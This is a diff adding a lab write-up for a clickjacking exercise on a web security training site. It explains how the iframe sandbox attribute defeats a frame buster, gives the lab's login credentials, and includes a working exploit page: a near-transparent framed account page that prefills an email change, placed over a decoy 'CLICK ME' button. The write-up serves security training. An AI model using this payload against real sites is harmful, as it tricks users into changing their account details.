@@ -1,0 +1,40 @@
+// Lab: Clickjacking with a frame buster script
+
+This lab is protected by a frame buster which prevents the website from being framed. Can you get around the frame buster and conduct a clickjacking attack that changes the users email address?
+
+To solve the lab, craft some HTML that frames the account page and fools the user into changing their email address by clicking on "Click me". The lab is solved when the email address is changed.
+
+You can log in to your own account using the following credentials: wiener:peter
+
+
+
+
+// Solution
+
+In the Frame busting techniques are often browser and platform specific and because of the flexibility of HTML they can usually be circumvented by attackers. As frame busters are JavaScript then the browser's security settings may prevent their operation or indeed the browser might not even support JavaScript. An effective attacker workaround against frame busters is to use the HTML5 iframe sandbox attribute. When this is set with the allow-forms or allow-scripts values and the allow-top-navigation value is omitted then the frame buster script can be neutralized as the iframe cannot check whether or not it is the top window.
+
+So we use sandbox attribute:
+https://0a9100410312cef380a60d1a001f000e.web-security-academy.net/my-account?email=bobby@microsoft.com" sandbox="allow-forms" 
+
+
+// Exploit
+
+<style>
+    iframe {
+        position:relative;
+        width:1000px;
+        height: 700px;
+        opacity: 0.1;
+        z-index: 2;
+    }
+    div {
+        position: absolute;
+        top: 468px;
+        left: 60px;
+        z-index: 1;
+    }
+</style>
+
+<div>CLICK ME</div>
+
+<iframe src="https://0a9100410312cef380a60d1a001f000e.web-security-academy.net/my-account?email=bobby@microsoft.com" sandbox="allow-forms"></iframe>
